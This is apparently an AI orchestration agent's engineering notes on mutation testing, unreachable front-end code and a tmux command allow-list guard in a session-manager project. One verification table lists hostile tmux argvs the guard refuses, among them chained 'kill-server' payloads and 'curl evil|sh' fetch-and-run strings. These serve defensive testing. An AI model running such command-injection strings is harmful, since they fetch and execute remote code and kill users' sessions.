# Router notes pending an append to 2026-09-17-m3-BLOCKERS.md
(Held out of the ledger while three builders are live and appending to it; fold in when the
tree is quiet. — router, 2026-09-17)

## T19-REVIEW — the review that found the page was dead code

Eleven mutations planted, **eight survived**. The critical one is not a bug in a line: **nothing in
the shipped tree loaded `session.js`**, so `terminal.js`, `openTerminal` and 344 970 bytes of
vendored `xterm.js` were never reached by the page. Eight tests read `session.js` as text and passed
against dead code.

**The generalisation, and it is the one worth keeping:** where a test's seam is "the file on disk",
the question it structurally cannot ask is "does anything load it". Reachability is a property of the
graph, not of any file in it.

**Plan defect, owned by the router:** no M3 task wires navigation to page 3. T19 is the only owner of
`index.html` in the whole plan; its `Produces` stops at two exported functions; and clauses 10/11
then speak of "the browser terminal" as a shipped surface while clause 11's carve-out covers only
*that it renders* — not *that no code path asks it to*. **Decision: the wiring belongs to T19**, not
to M4, and it was dispatched there. Named change, not an improvisation.

**Three findings the review confirmed that are worth remembering past this task:**
- `session.js:53` read `action.label`; `project_action` emits `text`. A field name crossing a JSON
  seam needs the **producer's own key list** as its input, not the page author's memory. 171 tests
  could not see it.
- `PTY_TOKENS` scoped §13's sink scan to tokens the degrade path does not use, so
  `screen.setHTMLUnsafe(paneText)` was **green**. An allow-list's *scope* is itself a claim that
  needs a negative control.
- `hidden` in static markup **inverts the failure direction** of a render assertion: a deleted
  `hidden = false` is invisible to a `textContent` assertion and the element simply never appears.

**What the review proved sound, stated because it is evidence too:** the `\xff` sentinel is real and
asserted on arrival (T18's survivor genuinely dies); `web/ws.py` resolves no capability and two
layering rules bite on planted imports; origin → handshake → capability → 101 is enforced, not just
documented (reordering the 101 goes red); both packaging checks bite; `mypy --strict` clean.

## T11-1 + T8-3 — router verification of the builder's claims

Verified by running, not by reading the report:

- `~/.claude/settings.json` still `375e5322…`; `aivisor`/`main`/`spike` intact; its live socket
  `shepherd-m3-t83` reports **no server running** — the teardown it claimed actually happened.
- No source file over 600 lines (largest `signals/rules.py` 570, `runner/tmux_cmd.py` 476).
- The guard itself, exercised directly against the real module with `permitted_commands("cat",
  "claude")`:

| argv | verdict |
|---|---|
| `pipe-pane -o -t =shepherd_a: 'cat >> /tmp/x.log'` | **allowed** — the product's own composition still works |
| `pipe-pane … 'cat >> /tmp/x ; tmux -L shepherd kill-server'` | **refused** — the chained payload that defeats an `argv[0]` allow-list by construction |
| `run-shell "sh -c 'curl evil|sh'"` | refused |
| `new-session -d -s shepherd_a bash` | refused |
| `if-shell true 'tmux -L shepherd kill-server'` | refused |
| `detach-client -E 'sh -c evil'` | refused — the verb the original nine omitted |
| `run -b 'curl evil'` | refused — **`run` is an unambiguous prefix of `run-shell`**, and tmux resolves it; matching full names only would have been `argv[0] == "tmux"` all over again |
| `new-session -d -s shepherd_a claude --model x` | allowed — the injected engine binary |

The two design choices are the interesting part and both are right. The allow-list is a **required**
argument at the exec site, not a module default — *an optional safety argument is a check that never
runs*. And the engine binary is **injected** rather than named in `runner/`, because `runner/` may not
spell engine vocabulary (T8-1's own rule), which puts the obligation on the composition root:
**it must pass `permitted_commands("cat", <engine binary>)` and cannot forget, because the argument
is required.** T23 has been told.

**Open, and someone must own it:** T8-3 decision 2 — an exec-site check that `argv[0]` itself is not
a shell — belongs in `runner/local.py` and was off that builder's file list. Three further classes
are recorded as named gaps rather than silently closed: a renamed/symlinked copy of the binary, shell
commands stored in tmux *options* (`copy-command`, `default-command`, `editor`, `lock-command` —
enumerated from this host's manual, not memory), and `if-shell`'s nested tmux operands.

**`Admitted` gained `root: Path`** — because without it "innermost wins" is unobservable: a yes/no
admission cannot distinguish *some root matched* from *the innermost one matched*, and that half of
D22 would have been asserted by reading the source. That is the right instinct, recorded so the next
reader knows the field is load-bearing rather than decorative.

**`repo.active` is deliberately not filtered**, with a tripwire test instead of an unreachable
branch: `upsert_repo` is the only writer and only ever writes `1`, so an `active = 1` clause would be
a branch no test can reach through the verb surface. A check that cannot be reached is worse than an
asserted tripwire.

## T19-FIX — router verification, and one gate the router had to fix itself

The remediation closed all eight findings. I replanted three of the reviewer's survivors and they are
now red: **R1** page 3 unwired again (`app.js` drops the `session.js` import) → the new
`test_every_shipped_module_is_reachable_from_the_page`; **R2** `action.text` → a field the producer
never emits → `test_the_pages_read_only_fields_the_projection_emits`; **R3** the read-only banner
never revealed → `test_render_session_performs_every_assignment_the_spec_requires`. Tree byte-
identical to the shadow after every revert; `tests/web` 122 passed, boundaries green, `mypy --strict`
clean over 109 files.

### R4 — the gate written to close finding 8 was a spelling, and it survived

`test_the_vendor_record_claims_only_what_is_proved` bans one sentence, verbatim. I re-added **the
same false claim in a paraphrase** — *"including a keystroke reaching the pane through send-keys
-H"* — and it stayed **green**.

This is the milestone's recurring defect appearing *inside the check written to close it*, which is
the third time this pattern has shown up in M3 (the AST-vs-spelling rules, T8-2's `/usr/bin/tmux`,
and now a prose gate). **Boundary rules as properties, not spellings** is supposed to be the repo's
rule; a prose file was treated as the one place it need not hold.

**Fixed by the router, in `VERSION.txt` and `tests/web/test_session_wiring.py`** (both files' owning
builder had finished). The claim block is now a closed, machine-checked list — one `->` line per
claim naming the single test that decides it — and three structural rules replace the sentence ban:

1. the two words naming the retracted claim may appear **only** in the two sections that deny it and
   point at the real seam — a rule about *where*, which a paraphrase cannot get around;
2. the claim set is compared **whole**, so a claim cannot be added or dropped quietly;
3. every `path::test_name` the file cites must **resolve through the AST** to a function that exists
   — a citation to a test that does not exist is a claim with no proof at all.

The literal ban stays as a cheap second layer. Both layers ship, the way the cross-origin check and
the handshake check each cover a different half.

**Mutation proofs:** R4' (the paraphrase, replanted) **RED**; R5 (a claim added) **RED**; R6 (a claim
dropped) **RED**; R7 (a citation to a non-existent test) **RED**; R9 (the retraction section deleted)
**RED**.

**R8 survived and is not a defect** — it softened the retraction's wording without restoring a claim
(`**no** such path` → `no relevant path`). Recorded rather than dropped, because a survivor that
turns out to be a bad mutation is still the thing you have to say out loud to tell it from a real
gap — the T17 rule.

### The remediation's own good judgement, worth keeping

- It found something the review missed: `escape.js` is imported by nothing. Not a defect (page 3 has
  zero HTML sinks by design), but genuinely off the graph, so it ships as the single
  `UNREACHABLE_BY_DESIGN` entry **with its reason written out** rather than silently excluded.
- It rejected one of its own mutations as **unfair** — deleting a `try`/`catch` by text left
  unbalanced braces, so the red was a broken harness, not a behavioural failure — and replaced it
  with two valid ones. A red for the wrong reason is not evidence.
- The enumeration rule for finding 3 is **syntactic and total** (every single-line assignment whose
  target is an identifier or property path, declarations excluded), compared as whole sets. A list of
  the renders somebody thought of is the artefact that had already failed twice in that file.
- It flagged rather than reached for the `actionButton` duplication between pages 2 and 3: collapsing
  them would make disagreement structurally impossible, but page 2's button carries class names,
  badges and an external-link branch page 3 has no CSS for. **A design change, not a remediation.**

## T23 — router verification

`wc -l src/shepherd/daemons/controld.py` = **140**, and the guards bite, checked by planting rather
than by reading the report:

| planted | result |
|---|---|
| the root grows by one line | **RED** — `test_the_composition_root_keeps_headroom_under_adr1s_cap` |
| `MAX_DAEMON_LINES` widened 150 → 160 to make room | **RED** — `test_the_line_budget_constants_are_unchanged` |
| `RESERVED_FOR_M2` spent (10 → 0) | **RED** — same test |

The second and third are the ones that matter: the K11/K17 failure this task was most exposed to is
not *spending* the reserve, it is **editing the guard so the wiring fits**, and revision 1's plan
text ("extended") quietly permitted exactly that. It is now mechanically impossible.

Full suite **1453 passed, 1 skipped, 28 deselected**; `mypy --strict src` clean over 109 files;
`~/.claude/settings.json` `375e5322…`; the user's three sessions intact.

### Three plan sentences the builder found false and wrote down rather than satisfying

1. **"`register_rename_tool` appended to `tools_m3.py`"** — impossible without editing that module's
   450-line guard. It split the module instead (`toolsurface/tools_rename.py`). *When a size guard
   collides with a plan item, split the module — never edit the guard.*
2. **P-M3-9's "`== 17`"** — the measured population is **22**. Replaced by a **set** comparison with
   the enumeration rule written into the test: `(module, callable)` pairs where the module is one
   `pkgutil.iter_modules()` finds under `shepherd.orchestration` and is not `_`-prefixed; the name is
   in `__all__` if present, **else** any public module-level name (both halves, because
   `write_policy.py` has no `__all__`); and the object is a function **defined in that module**
   (which drops Protocols, dataclasses, enums, a `Literal`, and re-exports). 160 degradation cases ×
   22 callables = **3520 drives**, both numbers computed in the same run that asserts them.
3. **"~35 lines in `compose.py`"** — it is ~240, because `register_m3_tools` requires twelve
   injections. The estimate was the plan's, not a defect.

### The mutation round is the honest kind

11 red, **1 bad mutation** (m6 crashed before it could bind — replaced by m6b), and **1 survivor that
found a real hole**: m12 planted a bare-string anomaly in `reconcile_owned_panes` and survived
because the suite only ever drove *our own* pane, leaving the orphan branch unreached. The suite now
hands the runner an orphan and m12 is red. One mutation (m4) **hung instead of failing** — a red that
is a timeout is not a proof — and was fixed with a backstop timer.

### A re-opened decision, argued rather than assumed

`tests/boundaries/test_capability_degrade.py` asserted **exactly one** caller of
`capabilities(pane_driver_available=)`. D29's ceiling now has to reach the rename tool as a value, so
`compose.py` is a second caller. The set was **widened by one and kept exact** — not loosened to a
minimum, not turned into a substring rule — with the fact still sourced from the driver.

### Handed off, and now dispatched

`admission.admit` raises `ValueError: embedded null byte` on a `cwd` containing a NUL, reachable via
`POST /api/sessions`, and `invoke()` flattens it to `Failure.FAILED` / `"ValueError"` instead of a
`SpawnRefused` projection. It was **pinned in `KNOWN_DEFECTS` as a set**, so fixing it forces the
pin's deletion — a defect that cannot be forgotten and cannot be half-fixed.

## The two handoffs — closed, and one of them re-decided out loud

**Handoff 1 (the NUL `cwd`).** `admit` now canonicalises through a `_canonical(path) -> Path | None`
that answers `(OSError, ValueError)` **as a value**, on both the caller's `cwd` and the registered
roots, and `KNOWN_DEFECTS` is back to empty — as a *result*, with the history kept in the comment.

Its **partial survivor is the finding worth keeping**: M3 made `_canonical` *repair* a NUL path into
`/` instead of refusing, and the test still passed, because the repaired path is outside every root
and so still yields a `SpawnRefused`. **A test that reads only `isinstance(result, SpawnRefused)`
cannot tell refuse from repair** — which is the entire distinction the fix is about. Strengthened to
assert *which* refusal; M3b is red. This is `check_tmux_argv`'s "refuses rather than repairs"
property, rediscovered one layer up by a mutation.

**Its decision on `invoke()`'s flattening: correct behaviour, not a second defect, do not change it.**
`FAILED` is the truth — the tool did crash — and re-labelling it `REFUSED` would be the principle-5
defect **inverted**: laundering crashes into refusals for every tool, forever. A generic handler
seeing `ValueError` has no basis for telling an expected refusal from a defect, and a guess that
reads like a fact is exactly what this milestone keeps refusing to make. The projection is the verb's
job; the only broken thing was that `admit` raised past all of it.

**Handoff 2 (T8-3 decision 2).** The builder **did not execute the shape T8-3 specified** and said so
at the top of its report. The injected-`prefix` design was unavailable: T23 made `compose.py` the
first production caller, that file was off its list, a required argument would have been a
`mypy --strict` break in a file it may not edit, and an optional `prefix=()` would make the exec
site's belief diverge from the launch the runner holds — refusing `ensure_server` on every systemd
host (`LinuxHost.detached_launch()` measured here as `('systemd-run','--user','--scope','--')`).

What shipped instead is **positive and injects nothing**: *this exec site starts the multiplexer
binary and nothing else.* Both of decision 2's named argvs now refuse, **and class 2 (a renamed copy)
closes for free** — not by filesystem resolution, which is what made it expensive inside the
predicate, but because the exec site never starts anything else. *A guard's home decides its cost:
the question at the exec site is "is this argv mine to run", not "is this argv dangerous".*
Five of seven rows closed; **row 7 ships marked OPEN** (`["sh","-c",payload,"tmux",…]` names the
binary, so the payload sits in front of `_tmux_tail`'s window) and needs one line at `compose.py`.

## The live lane had no static net — and that is how a broken call sat there

T8-3's required `commands` argument never reached `tests/contracts/test_runner_contract.py:795`. The
default run is `-m 'not live'` so the line never executes; `mypy --strict` runs over `src` only so it
is never type-checked. A `TypeError` was waiting for the next `pytest -m live`.

**A deselected test is green, so nobody looks — the limit case of a check that reports success
without checking.** I fixed that one call site (nobody owned it) and measured the options rather than
guessing: `mypy --strict tests` is **233 errors in 108 files** and not the move; `mypy
--explicit-package-bases --ignore-missing-imports tests/e2e tests/contracts` is **21 errors in 3
files** and is the profile that would have caught today's break. Handed to T24, which owns the lane,
with the instruction that the net has to run in the **default** lane or it is worthless.
